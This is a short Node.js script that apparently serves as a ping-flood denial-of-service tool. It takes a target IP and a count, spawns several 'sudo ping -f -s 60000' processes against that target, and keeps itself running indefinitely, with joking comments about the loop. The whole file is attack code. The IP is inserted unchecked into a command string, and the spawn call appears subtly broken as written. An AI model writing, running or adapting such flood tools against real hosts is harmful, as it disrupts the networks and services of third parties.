//imports

import yargs from 'yargs';
import { hideBin } from 'yargs/helpers';
import {spawn} from 'child_process'
//declarations

const yarg = yargs(hideBin(process.argv)).option("n",{default:5}).parse()
let i=1
let n=yarg.n
const ip= yarg._[0]



//code
while(i<n){spawn(`sudo ping -f -s 60000 ${ip}`); ++i}


setInterval(() => {
    //brother this loop is simply there to prevent the process from terminating.
    //if you are reading this, bro you lost the game
},1000);
